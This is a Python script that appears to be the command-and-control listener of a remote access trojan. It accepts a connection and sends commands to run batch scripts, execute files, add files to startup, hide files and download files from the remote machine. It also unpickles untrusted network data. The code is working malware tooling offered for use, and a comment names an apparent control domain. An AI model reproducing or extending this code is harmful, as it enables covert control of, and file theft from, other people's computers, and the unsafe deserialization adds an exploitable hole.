import socket
from pickle import loads
from time import sleep


class Socket:

    header = 20
    established = False
    current_working_directory = "Working Directory> "

    def __init__(self, ip_address, port):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((ip_address, port))
        self.socket.settimeout(2.0)
        self.listen_to_for_client()

    def listen_to_for_client(self):
        try:
            print("Listening...")
            self.socket.listen(1)
            self.connection, self.address = self.socket.accept()
            self.established = True
            print(f"Connection established with {self.address}")
        except socket.timeout:
            self.established = False

    def send_command(self, command):
        command = command.encode()
        try:
            self.connection.send(command)
        except ConnectionResetError:
            self.established = False
            print(f"Lost connection to {self.address}")
            return False
        if "-batch" in command.decode() or "cd.." in command.decode() or "cd" in command.decode() and "-cdrive" not in command.decode():
            self.receive_command_output(current_working_directory=True)
            return
        if "-download" in command.decode():
            name, ending = command.decode().split(".")
            name = name.replace("-download ", "")
            self.receive_command_output(download=True, file_ending=ending, file_name=name)
            return
        if "-exit" in command.decode():
            return
        self.receive_command_output()

    def receive_command_output(self, download=False, file_ending="", file_name="", current_working_directory=False):
        full_msg = b''
        new_msg = True
        while True:
            try:
                msg_rec = self.connection.recv(64)
            except (ConnectionAbortedError, ConnectionResetError, TimeoutError):
                self.established = False
                print(f"Lost connection to {self.address}")
                return False
            if new_msg:
                msg_len = int(msg_rec[:self.header])
                new_msg = False
            full_msg += msg_rec
            if len(full_msg) - self.header == msg_len:
                if download:
                    full_msg = full_msg[self.header:]
                    new_file = open(file_name + "." + file_ending, "wb+")
                    new_file.write(full_msg)
                    new_file.close()
                elif current_working_directory:
                    self.current_working_directory = full_msg
                else:
                    full_msg = loads(full_msg[self.header:])
                    print(full_msg)
            return full_msg


connection = Socket(socket.gethostname(), 20000)
print("\nexecute batch: -batch [args] [script(new line = /n)]")
print("execute file: -e")
print("startup file -s")
print("hide file -h")
print("Download file -download file_name")
while True:
    if not connection.established:
        connection.listen_to_for_client()
    if connection.established:
        user_input = input(connection.current_working_directory)
        if user_input != ' ' and user_input != '':
            connection.send_command(user_input)
        sleep(1)


# uhblajkil.cf
# macnhmal bleibt server stuck beim empfangen vllt richitges Timeout einbauen   ??
# Multiconnection
# cdrive geht nicht ganz 



